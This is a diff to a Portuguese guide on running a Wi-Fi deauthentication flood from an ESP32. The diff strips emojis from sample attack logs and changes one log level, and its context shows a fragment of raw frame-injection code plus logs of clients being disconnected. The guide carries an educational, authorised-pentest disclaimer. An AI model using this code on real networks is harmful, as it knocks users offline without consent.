@@ -61,7 +61,7 @@ void send_deauth_frame(uint8_t *target_mac) {
     esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
     
     deauth_frames_sent++;
-    ESP_LOGW(TAG, "💀 Frame deauth enviado para: " MACSTR, MAC2STR(target_mac));
+    ESP_LOGI(TAG, "💀 Frame deauth enviado para: " MACSTR, MAC2STR(target_mac));
 }
 ```
 
@@ -161,16 +161,16 @@ idf.py -p /dev/ttyUSB0 monitor
 
 ### 1. Início do Ataque
 ```
-I (2000) DEAUTH_FLOOD: 🚨 INICIANDO ATAQUE DEAUTH FLOOD! 🚨
-I (2010) DEAUTH_FLOOD: 🎯 Alvo: ESP32_AP
-I (2020) DEAUTH_FLOOD: ⚡ Intervalo: 100 ms
+I (2000) DEAUTH_FLOOD:  INICIANDO ATAQUE DEAUTH FLOOD! 
+I (2010) DEAUTH_FLOOD:  Alvo: ESP32_AP
+I (2020) DEAUTH_FLOOD:  Intervalo: 100 ms
 I (2030) DEAUTH_FLOOD: 🔢 Máximo de frames: 1000
 ```
 
 ### 2. Descoberta de Alvos
 ```
-I (3000) DEAUTH_FLOOD: 📡 Escaneando AP alvo...
-I (4000) DEAUTH_FLOOD: ✅ AP encontrado: ESP32_AP (Canal 6)
+I (3000) DEAUTH_FLOOD:  Escaneando AP alvo...
+I (4000) DEAUTH_FLOOD:  AP encontrado: ESP32_AP (Canal 6)
 I (4010) DEAUTH_FLOOD: 📍 BSSID: aa:bb:cc:dd:ee:ff
 I (4020) DEAUTH_FLOOD: 👥 Clientes detectados: 3
 ```
@@ -179,25 +179,25 @@ I (4020) DEAUTH_FLOOD: 👥 Clientes detectados: 3
 ```
 W (5000) DEAUTH_FLOOD: 💀 Frame deauth #1 enviado!
 W (5100) DEAUTH_FLOOD: 💀 Frame deauth #2 enviado!
-W (5200) DEAUTH_FLOOD: 🎯 Atacando cliente: 11:22:33:44:55:66
-W (5300) DEAUTH_FLOOD: 📡 Ataque broadcast executado
+W (5200) DEAUTH_FLOOD:  Atacando cliente: 11:22:33:44:55:66
+W (5300) DEAUTH_FLOOD:  Ataque broadcast executado
 ```
 
 ### 4. Estatísticas Periódicas
 ```
-I (10000) DEAUTH_FLOOD: 📊 ESTATÍSTICAS DO ATAQUE:
-I (10010) DEAUTH_FLOOD: ⚡ Frames enviados: 100
-I (10020) DEAUTH_FLOOD: 🎯 Clientes atacados: 3
-I (10030) DEAUTH_FLOOD: ⏱️ Tempo de ataque: 10s
-I (10040) DEAUTH_FLOOD: 💥 Taxa: 10 frames/seg
+I (10000) DEAUTH_FLOOD:  ESTATÍSTICAS DO ATAQUE:
+I (10010) DEAUTH_FLOOD:  Frames enviados: 100
+I (10020) DEAUTH_FLOOD:  Clientes atacados: 3
+I (10030) DEAUTH_FLOOD:  Tempo de ataque: 10s
+I (10040) DEAUTH_FLOOD:  Taxa: 10 frames/seg
 ```
 
 ### 5. Resultado Final
 ```
-W (30000) DEAUTH_FLOOD: ✅ ATAQUE CONCLUÍDO!
-W (30010) DEAUTH_FLOOD: 📊 Total de frames: 1000
-W (30020) DEAUTH_FLOOD: ⏱️ Duração total: 30 segundos
-W (30030) DEAUTH_FLOOD: 🎯 Eficácia estimada: 95%
+W (30000) DEAUTH_FLOOD:  ATAQUE CONCLUÍDO!
+W (30010) DEAUTH_FLOOD:  Total de frames: 1000
+W (30020) DEAUTH_FLOOD:  Duração total: 30 segundos
+W (30030) DEAUTH_FLOOD:  Eficácia estimada: 95%
 ```
 
 ## Detecção e Contramedidas
@@ -324,7 +324,7 @@ void multi_channel_deauth(void) {
 
 ## Uso Responsável
 
-⚠️ **AVISO LEGAL**:
+ **AVISO LEGAL**:
 - **Autorização Obrigatória**: Use apenas em redes próprias
 - **Fins Educacionais**: Para aprendizado e pesquisa
 - **Pentest Autorizado**: Com contrato e escopo definido
